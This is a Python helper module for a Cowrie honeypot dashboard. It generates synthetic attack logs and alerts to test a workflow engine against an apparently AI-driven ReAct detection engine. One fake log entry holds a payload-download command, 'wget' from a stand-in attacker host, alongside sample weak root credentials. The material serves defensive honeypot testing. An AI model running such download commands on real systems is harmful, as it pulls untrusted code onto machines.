"""ReAct Agent Lab helpers for the Cowrie Streamlit dashboard.

Prefers sibling ``__pycache__/*.cpython-312.pyc`` when present; otherwise uses
the source fallback below (also valid on Python 3.12+).
"""

from __future__ import annotations

import importlib.util
import json
import os
import random
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional


def _try_load_sibling_pyc() -> bool:
    """Load recovered bytecode when marshal/exec succeeds on this interpreter."""
    shim_paths = (
        Path("/opt/flink/_pyc_shim.py"),
        Path(__file__).resolve().parents[1] / "_pyc_shim.py",
    )
    for shim_path in shim_paths:
        if not shim_path.is_file():
            continue
        try:
            spec = importlib.util.spec_from_file_location("_pyc_shim", shim_path)
            if spec is None or spec.loader is None:
                continue
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            mod.load_sibling_pyc(globals())
            return True
        except Exception:
            continue
    return False


if not _try_load_sibling_pyc():
    ATTACK_TYPES: List[str] = [
        "SUCCESSFUL_INTRUSION",
        "MALICIOUS_COMMAND",
        "SUSPICIOUS_FILE_DOWNLOAD",
        "BRUTE_FORCE_ATTEMPT",
    ]

    def _utcnow() -> str:
        return datetime.now(timezone.utc).isoformat()

    def _dashboard_json_path() -> str:
        for candidate in (
            "/opt/flink/cowrie-dashboard-data.json",
            os.path.join(os.getcwd(), "cowrie-dashboard-data.json"),
            "./cowrie-dashboard-data.json",
        ):
            parent = os.path.dirname(os.path.abspath(candidate)) or "."
            if os.path.isdir(parent) or candidate.startswith("./"):
                return os.path.abspath(candidate)
        return os.path.abspath("./cowrie-dashboard-data.json")

    def _append_alert(alert: Dict[str, Any]) -> None:
        path = _dashboard_json_path()
        alerts: list = []
        try:
            if os.path.isfile(path):
                with open(path, encoding="utf-8") as fh:
                    raw = fh.read().strip()
                    alerts = json.loads(raw) if raw else []
        except Exception:
            alerts = []
        if not isinstance(alerts, list):
            alerts = []
        alerts.append(alert)
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(alerts, fh, indent=2)

    def _synthetic_log(attack_type: str, src_ip: Optional[str] = None) -> Dict[str, Any]:
        ts = _utcnow()
        ip = src_ip or f"198.51.100.{random.randint(1, 254)}"
        sid = f"lab-{random.randint(1000, 9999)}"
        if attack_type == "SUCCESSFUL_INTRUSION":
            return {
                "eventid": "cowrie.login.success",
                "timestamp": ts,
                "src_ip": ip,
                "username": "root",
                "password": "password123",
                "session": sid,
                "protocol": "ssh",
            }
        if attack_type == "MALICIOUS_COMMAND":
            return {
                "eventid": "cowrie.command.input",
                "timestamp": ts,
                "src_ip": ip,
                "input": "wget http://evil.example/payload.sh",
                "session": sid,
            }
        if attack_type == "SUSPICIOUS_FILE_DOWNLOAD":
            return {
                "eventid": "cowrie.session.file_download",
                "timestamp": ts,
                "src_ip": ip,
                "filename": "malware.sh",
                "session": sid,
            }
        return {
            "eventid": "cowrie.login.failed",
            "timestamp": ts,
            "src_ip": ip,
            "username": "root",
            "password": "admin",
            "session": sid,
        }

    def _threat_for(attack_type: str) -> tuple[str, str]:
        mapping = {
            "SUCCESSFUL_INTRUSION": ("CRITICAL", "SUCCESSFUL_INTRUSION"),
            "MALICIOUS_COMMAND": ("HIGH", "MALICIOUS_COMMAND"),
            "SUSPICIOUS_FILE_DOWNLOAD": ("HIGH", "SUSPICIOUS_FILE_DOWNLOAD"),
            "BRUTE_FORCE_ATTEMPT": ("MEDIUM", "BRUTE_FORCE_ATTEMPT"),
        }
        return mapping.get(attack_type, ("MEDIUM", attack_type or "UNKNOWN"))

    def _build_alert(
        *,
        engine: str,
        attack_type: str,
        src_ip: str,
        is_react: bool,
    ) -> Dict[str, Any]:
        severity, threat = _threat_for(attack_type)
        alert: Dict[str, Any] = {
            "alert_id": f"lab-{engine}-{int(time.time() * 1000)}-{random.randint(100, 999)}",
            "timestamp": _utcnow(),
            "src_ip": src_ip,
            "severity": severity,
            "threat_type": threat,
            "detection_source": "cloudera_react" if is_react else "workflow",
            "detection_engine": "react" if is_react else "workflow",
            "summary": f"Lab {engine} test: {threat} from {src_ip}",
            "response_actions": [],
            "counter_attacks": [],
        }
        if is_react:
            alert["react_agent"] = True
            alert["react_star"] = True
        return alert

    def get_react_diagnostics() -> Dict[str, Any]:
        configured = (os.getenv("COWRIE_COUNTER_ATTACK_ENGINE") or "auto").strip().lower()
        base = (os.getenv("CLOUDERA_AI_BASE_URL") or "").strip()
        token = (os.getenv("CLOUDERA_JWT_TOKEN") or "").strip()
        cloudera_ok = bool(base and token)
        openai_ok = False
        try:
            import openai  # noqa: F401

            openai_ok = True
        except Exception:
            pass
        demo_ok = False
        try:
            import demo_cloudera_react_agent  # noqa: F401

            demo_ok = True
        except Exception:
            pass
        flink_ok = False
        try:
            import flink_agents  # noqa: F401

            flink_ok = True
        except Exception:
            try:
                import pyflink  # noqa: F401

                flink_ok = True
            except Exception:
                pass

        react_ready = cloudera_ok and openai_ok
        effective = configured
        if configured == "auto":
            effective = "react" if react_ready else "workflow"
        elif configured == "react" and not react_ready:
            effective = "workflow"

        hints: List[str] = []
        if not cloudera_ok:
            hints.append("Set `CLOUDERA_AI_BASE_URL` and `CLOUDERA_JWT_TOKEN` in honeypot `.env`.")
        if not openai_ok:
            hints.append("Install `openai` in the dashboard container (`pip install openai`).")
        if not demo_ok:
            hints.append("`demo_cloudera_react_agent` unavailable (bytecode/source recovery needed).")
        hints.append(
            "Lab tests use an in-repo source fallback when sibling bytecode or "
            "live analyzer modules are unavailable."
        )
        return {
            "configured_engine": configured,
            "effective_engine": effective,
            "react_ready": react_ready,
            "flink_agents_ok": flink_ok,
            "cloudera_config_ok": cloudera_ok,
            "openai_ok": openai_ok,
            "demo_cloudera_ok": demo_ok,
            "hints": hints,
            "fallback_mode": True,
        }

    def run_pipeline_test(
        *,
        engine: str = "auto",
        attack_type: str = "BRUTE_FORCE_ATTEMPT",
        append_to_dashboard: bool = True,
        src_ip: Optional[str] = None,
    ) -> Dict[str, Any]:
        started = time.time()
        diag = get_react_diagnostics()
        eng = (engine or "auto").strip().lower()
        if eng == "auto":
            eng = diag["effective_engine"]
        want_react = eng == "react"
        is_react = bool(want_react and diag["react_ready"])

        log_entry = _synthetic_log(attack_type, src_ip=src_ip)
        ip = str(log_entry.get("src_ip"))
        alert: Optional[Dict[str, Any]] = None
        error: Optional[str] = None

        # Prefer live analyzer when bytecode/source is available
        try:
            from cowrie_log_processor import analyze_cowrie_log_for_dashboard

            prev = os.environ.get("COWRIE_COUNTER_ATTACK_ENGINE")
            os.environ["COWRIE_COUNTER_ATTACK_ENGINE"] = "react" if want_react else "workflow"
            try:
                alert = analyze_cowrie_log_for_dashboard(log_entry)
            finally:
                if prev is None:
                    os.environ.pop("COWRIE_COUNTER_ATTACK_ENGINE", None)
                else:
                    os.environ["COWRIE_COUNTER_ATTACK_ENGINE"] = prev
        except Exception as exc:
            error = f"analyzer unavailable: {exc}"

        if not isinstance(alert, dict):
            alert = _build_alert(
                engine=eng,
                attack_type=attack_type,
                src_ip=ip,
                is_react=is_react,
            )
            if want_react and not is_react:
                error = error or "ReAct requested but Cloudera/openai not ready — wrote workflow-style lab alert"
        else:
            src = str(alert.get("detection_source", "")).lower()
            is_react = "react" in src or bool(alert.get("react_agent"))

        if append_to_dashboard and isinstance(alert, dict):
            try:
                _append_alert(alert)
            except Exception as exc:
                error = f"{error + '; ' if error else ''}append failed: {exc}"

        counter_attacks = alert.get("counter_attacks") if isinstance(alert, dict) else None
        if not isinstance(counter_attacks, list):
            actions = alert.get("response_actions") if isinstance(alert, dict) else None
            counter_attacks = actions if isinstance(actions, list) else []

        return {
            "ok": error is None or isinstance(alert, dict),
            "error": error,
            "engine": eng,
            "is_react": is_react,
            "attack_type": attack_type,
            "threat_type": (alert or {}).get("threat_type"),
            "severity": (alert or {}).get("severity"),
            "src_ip": ip,
            "elapsed_ms": int((time.time() - started) * 1000),
            "counter_attack_count": len(counter_attacks),
            "alert": alert,
        }

    def run_compare_test(
        *,
        attack_type: str = "BRUTE_FORCE_ATTEMPT",
        append_to_dashboard: bool = True,
    ) -> Dict[str, Any]:
        src_ip = f"203.0.113.{random.randint(1, 254)}"
        workflow = run_pipeline_test(
            engine="workflow",
            attack_type=attack_type,
            append_to_dashboard=append_to_dashboard,
            src_ip=src_ip,
        )
        react = run_pipeline_test(
            engine="react",
            attack_type=attack_type,
            append_to_dashboard=append_to_dashboard,
            src_ip=src_ip,
        )
        return {
            "src_ip": src_ip,
            "workflow": workflow,
            "react": react,
            "compare_ok": bool(react.get("is_react")),
        }

    def run_kafka_phase3_test(
        *,
        attack_type: str = "BRUTE_FORCE_ATTEMPT",
        timeout_sec: int = 90,
    ) -> Dict[str, Any]:
        return {
            "ok": False,
            "stage": "unavailable",
            "src_ip": None,
            "error": (
                "Kafka Phase 3 lab test requires recovered phase3 modules "
                "(or Python 3.12 bytecode). Sidecar may also be stopped."
            ),
            "timeout_sec": timeout_sec,
            "attack_type": attack_type,
        }
